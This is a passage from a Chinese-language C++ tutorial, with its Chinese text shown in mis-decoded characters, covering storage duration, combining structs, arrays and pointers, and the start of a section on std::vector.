class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_static_var = <span class="number">10</span>; <span class="comment">// é™æ€å­˜å‚¨ (å…¨å±€)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> file_static_var = <span class="number">20</span>; <span class="comment">// é™æ€å­˜å‚¨ (æ–‡ä»¶ä½œç”¨åŸŸ)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> auto_var = <span class="number">30</span>; <span class="comment">// è‡ªåŠ¨å­˜å‚¨ (æ ˆ)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> func_static_var = <span class="number">40</span>; <span class="comment">// é™æ€å­˜å‚¨ (å‡½æ•°ä½œç”¨åŸŸï¼Œåªåˆå§‹åŒ–ä¸€æ¬¡)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> *dynamic_var = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">50</span>); <span class="comment">// åŠ¨æ€å­˜å‚¨ (å †)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Inside func:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  auto_var address: &quot;</span> &lt;&lt; &amp;auto_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; auto_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  func_static_var address: &quot;</span> &lt;&lt; &amp;func_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; ++func_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  dynamic_var address: &quot;</span> &lt;&lt; dynamic_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; *dynamic_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">delete</span> dynamic_var; <span class="comment">// å¿…é¡»æ‰‹åŠ¨é‡Šæ”¾åŠ¨æ€å†…å­˜</span></span><br><span class="line">    dynamic_var = <span class="literal">nullptr</span>;</span><br><span class="line">&#125; <span class="comment">// auto_var åœ¨è¿™é‡Œé”€æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Global static var address: &quot;</span> &lt;&lt; &amp;global_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; global_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File static var address: &quot;</span> &lt;&lt; &amp;file_static_var &lt;&lt; <span class="string">&quot; value: &quot;</span> &lt;&lt; file_static_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling func first time:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    func();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nCalling func second time:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    func(); <span class="comment">// æ³¨æ„ func_static_var çš„å€¼ä¼šä¿æŒ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int* dangling_ptr;</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     int temp_auto = 100; // è‡ªåŠ¨å­˜å‚¨</span></span><br><span class="line">    <span class="comment">//     dangling_ptr = &amp;temp_auto;</span></span><br><span class="line">    <span class="comment">// &#125; // temp_auto é”€æ¯</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; *dangling_ptr; // é”™è¯¯! æ‚¬æŒ‚æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç†è§£è¿™ä¸‰ç§å­˜å‚¨æ–¹å¼å¯¹äºç¼–å†™å¥å£®ã€é«˜æ•ˆä¸”æ— å†…å­˜é”™è¯¯çš„ C++ ç¨‹åºè‡³å…³é‡è¦ã€‚ç°ä»£ C++ å€¾å‘äºä½¿ç”¨ RAII (Resource Acquisition Is Initialization) æŠ€æœ¯å’Œæ™ºèƒ½æŒ‡é’ˆï¼ˆå¦‚ <code>std::unique_ptr</code>, <code>std::shared_ptr</code>ï¼‰æ¥è‡ªåŠ¨ç®¡ç†åŠ¨æ€å†…å­˜ï¼Œä»¥å‡å°‘æ‰‹åŠ¨ <code>new</code>/<code>delete</code> å¸¦æ¥çš„é£é™©ã€‚</p><h2 id="4-9-ç±»å‹ç»„åˆ"><a href="#4-9-ç±»å‹ç»„åˆ" class="headerlink" title="4.9 ç±»å‹ç»„åˆ"></a>4.9 ç±»å‹ç»„åˆ</h2><p>C++ çš„å¼ºå¤§ä¹‹å¤„åœ¨äºå…¶ç±»å‹ç³»ç»Ÿå…è®¸ä½ å°†åŸºæœ¬ç±»å‹ã€å¤åˆç±»å‹ï¼ˆæ•°ç»„ã€ç»“æ„ã€å…±ç”¨ä½“ã€æšä¸¾ï¼‰å’ŒæŒ‡é’ˆä»¥å¤šç§æ–¹å¼ç»„åˆèµ·æ¥ï¼Œåˆ›å»ºæ›´å¤æ‚çš„æ•°æ®ç»“æ„æ¥ç²¾ç¡®åœ°æ¨¡æ‹Ÿç°å®ä¸–ç•Œçš„é—®é¢˜ã€‚</p><p>æœ¬ç« æˆ‘ä»¬å·²ç»æ¥è§¦äº†ä¸€äº›ç»„åˆï¼š</p><ul><li>  <strong>ç»“æ„æ•°ç»„ (Array of Structures):</strong> æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ (è§ 4.4.5)ã€‚</li><li>  <strong>ç»“æ„åŒ…å« <code>std::string</code> æˆå‘˜:</strong> ç»“æ„ä½“å¯ä»¥åŒ…å«ç±»ç±»å‹çš„æˆå‘˜ (è§ 4.4.3)ã€‚</li><li>  <strong>æŒ‡é’ˆæŒ‡å‘ç»“æ„:</strong> å¯ä»¥å£°æ˜æŒ‡å‘ç»“æ„ä½“å¯¹è±¡çš„æŒ‡é’ˆ (è§ 4.8.4)ã€‚</li><li>  <strong>æŒ‡é’ˆæŒ‡å‘æ•°ç»„ (æˆ–æ•°ç»„åè§†ä¸ºæŒ‡é’ˆ):</strong> æŒ‡é’ˆå¯ä»¥ç”¨æ¥æ“ä½œæ•°ç»„ (è§ 4.8.1)ã€‚</li></ul><p>æœ¬èŠ‚å°†è¿›ä¸€æ­¥æ¢è®¨ä¸€äº›å¸¸è§çš„ç±»å‹ç»„åˆæ–¹å¼ã€‚</p><p><strong>1. ç»“æ„åŒ…å«æ•°ç»„æˆå‘˜:</strong></p><p>ç»“æ„ä½“å¯ä»¥åŒ…å«æ•°ç»„ä½œä¸ºå…¶æˆå‘˜ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StudentGrades</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> studentName;</span><br><span class="line">    <span class="keyword">int</span> grades[<span class="number">5</span>]; <span class="comment">// åŒ…å«ä¸€ä¸ª int æ•°ç»„ä½œä¸ºæˆå‘˜</span></span><br><span class="line">    <span class="keyword">int</span> numGrades; <span class="comment">// è®°å½•å®é™…å­˜å‚¨çš„æˆç»©æ•°é‡</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StudentGrades alice;</span><br><span class="line">    alice.studentName = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    alice.grades[<span class="number">0</span>] = <span class="number">95</span>;</span><br><span class="line">    alice.grades[<span class="number">1</span>] = <span class="number">88</span>;</span><br><span class="line">    alice.grades[<span class="number">2</span>] = <span class="number">92</span>;</span><br><span class="line">    alice.numGrades = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; alice.studentName &lt;&lt; <span class="string">&quot;&#x27;s first grade: &quot;</span> &lt;&lt; alice.grades[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; alice.numGrades; ++i) &#123;</span><br><span class="line">        sum += alice.grades[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (alice.numGrades &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average grade: &quot;</span> &lt;&lt; sum / alice.numGrades &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2. ç»“æ„åŒ…å«æŒ‡é’ˆæˆå‘˜:</strong></p><p>ç»“æ„ä½“å¯ä»¥åŒ…å«æŒ‡é’ˆä½œä¸ºæˆå‘˜ã€‚è¿™å¸¸ç”¨äºæŒ‡å‘åŠ¨æ€åˆ†é…çš„å†…å­˜æˆ–æŒ‡å‘å…¶ä»–æ•°æ®ç»“æ„ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DynamicData</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> label;</span><br><span class="line">    <span class="keyword">int</span>* data_ptr; <span class="comment">// æŒ‡å‘åŠ¨æ€åˆ†é…çš„ int æ•°ç»„</span></span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DynamicData myData;</span><br><span class="line">    myData.label = <span class="string">&quot;Sensor Readings&quot;</span>;</span><br><span class="line">    myData.size = <span class="number">10</span>;</span><br><span class="line">    myData.data_ptr = <span class="keyword">new</span> <span class="keyword">int</span>[myData.size]; <span class="comment">// åŠ¨æ€åˆ†é…å†…å­˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–åŠ¨æ€æ•°æ®</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; myData.size; ++i) &#123;</span><br><span class="line">        myData.data_ptr[i] = i * i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Label: &quot;</span> &lt;&lt; myData.label &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data at index 3: &quot;</span> &lt;&lt; myData.data_ptr[<span class="number">3</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// **é‡è¦:** å¿…é¡»æ‰‹åŠ¨é‡Šæ”¾æŒ‡é’ˆæˆå‘˜æŒ‡å‘çš„åŠ¨æ€å†…å­˜</span></span><br><span class="line">    <span class="keyword">delete</span> [] myData.data_ptr; </span><br><span class="line">    myData.data_ptr = <span class="literal">nullptr</span>; <span class="comment">// é¿å…æ‚¬æŒ‚æŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> å½“ç»“æ„åŒ…å«æŒ‡é’ˆæˆå‘˜æŒ‡å‘åŠ¨æ€å†…å­˜æ—¶ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„å†…å­˜ç®¡ç†ï¼ˆå¤åˆ¶ã€èµ‹å€¼ã€ææ„ï¼‰ï¼Œè¿™é€šå¸¸æ¶‰åŠåˆ°ç±»çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆæ‹·è´æ„é€ å‡½æ•°ã€æ‹·è´èµ‹å€¼è¿ç®—ç¬¦ã€ææ„å‡½æ•°ï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚æ·±å…¥å­¦ä¹ ã€‚</p><p><strong>3. æŒ‡é’ˆæ•°ç»„ (Array of Pointers):</strong></p><p>å¯ä»¥åˆ›å»ºæ•°ç»„ï¼Œå…¶æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>, c = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">int</span>* ptr_array[<span class="number">3</span>]; <span class="comment">// å£°æ˜ä¸€ä¸ªåŒ…å« 3 ä¸ª int* æŒ‡é’ˆçš„æ•°ç»„</span></span><br><span class="line"></span><br><span class="line">    ptr_array[<span class="number">0</span>] = &amp;a; <span class="comment">// ç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å‘ a</span></span><br><span class="line">    ptr_array[<span class="number">1</span>] = &amp;b; <span class="comment">// ç¬¬äºŒä¸ªå…ƒç´ æŒ‡å‘ b</span></span><br><span class="line">    ptr_array[<span class="number">2</span>] = &amp;c; <span class="comment">// ç¬¬ä¸‰ä¸ªå…ƒç´ æŒ‡å‘ c</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Values via pointer array:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Value at *ptr_array[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]: &quot;</span> &lt;&lt; *ptr_array[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥æŒ‡å‘åŠ¨æ€åˆ†é…çš„å†…å­˜</span></span><br><span class="line">    <span class="keyword">int</span>* dyn_ptr_array[<span class="number">2</span>];</span><br><span class="line">    dyn_ptr_array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">100</span>);</span><br><span class="line">    dyn_ptr_array[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDynamic values:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *dyn_ptr_array[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *dyn_ptr_array[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡Šæ”¾åŠ¨æ€å†…å­˜</span></span><br><span class="line">    <span class="keyword">delete</span> dyn_ptr_array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">delete</span> dyn_ptr_array[<span class="number">1</span>];</span><br><span class="line">    dyn_ptr_array[<span class="number">0</span>] = <span class="literal">nullptr</span>;</span><br><span class="line">    dyn_ptr_array[<span class="number">1</span>] = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‡é’ˆæ•°ç»„å¸¸ç”¨äºå­˜å‚¨ C é£æ ¼å­—ç¬¦ä¸²æ•°ç»„ï¼ˆ<code>const char*[]</code>ï¼‰æˆ–ç®¡ç†ä¸€ç»„åŠ¨æ€åˆ†é…çš„å¯¹è±¡ã€‚</p><p><strong>4. æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ (Pointer to Pointer):</strong></p><p>æŒ‡é’ˆæœ¬èº«ä¹Ÿæ˜¯å˜é‡ï¼Œå®ƒä¹Ÿæœ‰è‡ªå·±çš„å†…å­˜åœ°å€ã€‚å› æ­¤ï¼Œå¯ä»¥å£°æ˜ä¸€ä¸ªæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">42</span>;</span><br><span class="line">    <span class="keyword">int</span> *ptr = &amp;value;      <span class="comment">// ptr æŒ‡å‘ value (int*)</span></span><br><span class="line">    <span class="keyword">int</span> **pptr = &amp;ptr;      <span class="comment">// pptr æŒ‡å‘ ptr (int**)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;             <span class="comment">// 42</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of value (&amp;value): &quot;</span> &lt;&lt; &amp;value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of ptr (address of value): &quot;</span> &lt;&lt; ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// value çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via ptr (*ptr): &quot;</span> &lt;&lt; *ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;           <span class="comment">// 42</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of ptr (&amp;ptr): &quot;</span> &lt;&lt; &amp;ptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of pptr (address of ptr): &quot;</span> &lt;&lt; pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ptr çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via pptr (*pptr): &quot;</span> &lt;&lt; *pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// ptr çš„å€¼ (å³ value çš„åœ°å€)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via pptr (**pptr): &quot;</span> &lt;&lt; **pptr &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// value çš„å€¼ (42)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿®æ”¹å€¼</span></span><br><span class="line">    **pptr = <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;New value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 50</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆå¸¸ç”¨äºï¼š</p><ul><li>  åœ¨å‡½æ•°ä¸­ä¿®æ”¹è°ƒç”¨è€…ä¼ å…¥çš„æŒ‡é’ˆæœ¬èº«ï¼ˆä½¿å…¶æŒ‡å‘ä¸åŒçš„åœ°å€ï¼‰ã€‚</li><li>  å¤„ç†åŠ¨æ€åˆ†é…çš„æŒ‡é’ˆæ•°ç»„ï¼ˆä¾‹å¦‚ <code>char** argv</code> in <code>main</code>ï¼‰ã€‚</li></ul><p><strong>æ€»ç»“:</strong></p><p>é€šè¿‡ç»„åˆåŸºæœ¬ç±»å‹ã€æ•°ç»„ã€ç»“æ„ã€æŒ‡é’ˆç­‰ï¼Œå¯ä»¥æ„å»ºå‡ºéå¸¸çµæ´»å’Œå¼ºå¤§çš„æ•°æ®ç»“æ„ã€‚ç†è§£æ¯ç§ç»„åˆæ–¹å¼çš„å†…å­˜å¸ƒå±€ã€è®¿é—®æ–¹å¼ä»¥åŠï¼ˆç‰¹åˆ«æ˜¯æ¶‰åŠæŒ‡é’ˆå’ŒåŠ¨æ€å†…å­˜æ—¶ï¼‰ç”Ÿå‘½å‘¨æœŸç®¡ç†è§„åˆ™æ˜¯ç¼–å†™å¤æ‚ C++ç¨‹åºçš„å…³é”®ã€‚éšç€å­¦ä¹ çš„æ·±å…¥ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°æ›´å¤šé«˜çº§çš„ç»„åˆå’ŒæŠ½è±¡æ–¹å¼ï¼Œä¾‹å¦‚ä½¿ç”¨ç±»å’Œæ ‡å‡†åº“å®¹å™¨ã€‚</p><h2 id="4-10-æ•°ç»„çš„æ›¿ä»£å“"><a href="#4-10-æ•°ç»„çš„æ›¿ä»£å“" class="headerlink" title="4.10 æ•°ç»„çš„æ›¿ä»£å“"></a>4.10 æ•°ç»„çš„æ›¿ä»£å“</h2><p>è™½ç„¶ C++ å†…ç½®çš„æ•°ç»„ï¼ˆåŒ…æ‹¬åŠ¨æ€åˆ†é…çš„æ•°ç»„ï¼‰åŠŸèƒ½å¼ºå¤§ï¼Œä½†å®ƒä»¬å­˜åœ¨ä¸€äº›å›ºæœ‰çš„ç¼ºç‚¹ï¼šæ•°ç»„å¤§å°é€šå¸¸éœ€è¦åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼ˆå¯¹äºæ ˆä¸Šçš„æ•°ç»„ï¼‰ï¼Œæˆ–è€…éœ€è¦æ‰‹åŠ¨è¿›è¡ŒåŠ¨æ€å†…å­˜ç®¡ç†ï¼ˆå¯¹äºå †ä¸Šçš„æ•°ç»„ï¼‰ï¼Œå¹¶ä¸”ä¸æä¾›è¾¹ç•Œæ£€æŸ¥ç­‰å®‰å…¨ç‰¹æ€§ã€‚</p><p>C++ æ ‡å‡†æ¨¡æ¿åº“ (STL) æä¾›äº†æ›´å®‰å…¨ã€æ›´çµæ´»çš„æ•°ç»„æ›¿ä»£å“ï¼š<code>vector</code> å’Œ <code>array</code>ã€‚</p><h3 id="4-10-1-æ¨¡æ¿ç±»vector"><a href="#4-10-1-æ¨¡æ¿ç±»vector" class="headerlink" title="4.10.1 æ¨¡æ¿ç±»vector"></a>4.10.1 æ¨¡æ¿ç±»vector</h3><p><code>std::vector</code> æ˜¯ STL æä¾›çš„ä¸€ä¸ª<strong>åŠ¨æ€æ•°ç»„</strong>æ¨¡æ¿ç±»ã€‚å®ƒå°è£…äº†åŠ¨æ€å¤§å°çš„æ•°ç»„ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è‡ªåŠ¨å¢é•¿æˆ–ç¼©å°ï¼Œå¹¶è´Ÿè´£ç®¡ç†å…¶å…ƒç´ çš„å†…å­˜ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  <strong>åŠ¨æ€å¤§å°:</strong> å¯ä»¥åœ¨è¿è¡Œæ—¶æ·»åŠ æˆ–åˆ é™¤å…ƒç´ ï¼Œ<code>vector</code> ä¼šè‡ªåŠ¨å¤„ç†å†…å­˜çš„é‡æ–°åˆ†é…ã€‚</li><li>  <strong>å†…å­˜ç®¡ç†:</strong> è‡ªåŠ¨ç®¡ç†å…ƒç´ å­˜å‚¨çš„å†…å­˜ï¼ˆé€šå¸¸åœ¨è‡ªç”±å­˜å‚¨åŒº/å †ä¸Šåˆ†é…ï¼‰ã€‚</li><li>  <strong>éšæœºè®¿é—®:</strong> åƒæ™®é€šæ•°ç»„ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡ç´¢å¼• <code>[]</code> å¿«é€Ÿè®¿é—®ä»»ä½•å…ƒç´ 